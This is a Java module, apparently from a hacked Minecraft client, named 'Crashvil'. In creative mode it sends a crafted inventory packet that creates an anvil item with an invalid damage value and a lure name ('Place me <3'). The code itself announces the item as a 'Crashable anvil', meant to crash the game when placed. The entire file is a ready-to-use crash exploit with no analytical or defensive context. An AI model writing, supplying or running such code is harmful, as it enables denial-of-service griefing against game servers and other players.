package org.m0jang.crystal.Mod.Collection.Misc;

import net.minecraft.client.Minecraft;
import net.minecraft.init.Blocks;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import org.m0jang.crystal.Mod.Category;
import org.m0jang.crystal.Mod.Module;
import org.m0jang.crystal.Utils.ChatUtils;

public class Crashvil extends Module {
   public Crashvil() {
      super("Crashvil", Category.Misc, false);
   }

   public void onEnable() {
      if (Minecraft.thePlayer.inventory.getStackInSlot(0) != null) {
         ChatUtils.sendMessageToPlayer("Please clear the first slot in your hotbar.");
         this.setEnabled(false);
      } else if (!Minecraft.thePlayer.capabilities.isCreativeMode) {
         ChatUtils.sendMessageToPlayer("Creative mode only.");
         this.setEnabled(false);
      } else {
         ItemStack stack = new ItemStack(Item.getItemFromBlock(Blocks.anvil));
         stack.setItemDamage(1337);
         stack.setStackDisplayName("Place me Â\247c<3");
         Minecraft.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, stack));
         Minecraft.thePlayer.closeScreen();
         ChatUtils.sendMessageToPlayer("Crashable anvil created.");
         this.setEnabled(false);
      }
   }
}
